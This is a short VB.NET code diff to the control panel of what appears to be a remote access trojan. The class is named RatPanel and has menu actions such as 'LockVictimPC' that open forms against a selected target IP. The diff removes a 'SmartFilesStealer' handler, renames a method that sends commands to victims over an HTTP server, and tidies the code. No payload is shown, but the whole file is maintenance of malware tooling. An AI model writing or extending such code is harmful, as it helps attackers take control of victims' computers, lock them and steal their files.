@@ -16,7 +16,7 @@ Public Class RatPanel
     Private Sub RatPanel_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
         demandsClosing = True
         ClientListManager.CancelAsync()
-        Environment.Exit(0)
+        End
     End Sub
 
     Private Sub AddLogMessage(message As String)
@@ -103,7 +103,7 @@ Public Class RatPanel
     ''' This function automatically grabs the target IP,
     ''' then asks for safety and finally proceed to a direct command query on the HTTP server
     ''' </summary>
-    Private Sub runDirectPanelCommand(message As String,
+    Private Sub RunDirectPanelCommand(message As String,
                                       actionType As String,
                                       actionContent As String())
 
@@ -200,11 +200,6 @@ Public Class RatPanel
         form.targetIp = connectedClientsView.CurrentCell.Value.ToString
         form.Show()
     End Sub
-    Private Sub SmartFilesStealerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SmartFilesStealerToolStripMenuItem.Click
-        Dim form As New SmartFiles()
-        form.targetIp = connectedClientsView.CurrentCell.Value.ToString
-        form.Show()
-    End Sub
     Private Sub LockVictimPCToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LockVictimPCToolStripMenuItem.Click
         Dim form As New LockPC()
         form.targetIp = connectedClientsView.CurrentCell.Value.ToString
@@ -255,11 +250,5 @@ Public Class RatPanel
     Private Sub Button1_Click(sender As Object, e As EventArgs)
         If Button1.Text = "EDIT" Then Button1.Text = "SAVE" : TextBox1.Enabled = True Else Button1.Text = "EDIT" : TextBox1.Enabled = False
     End Sub
-
-
-
-
-
-
 #End Region
 End Class
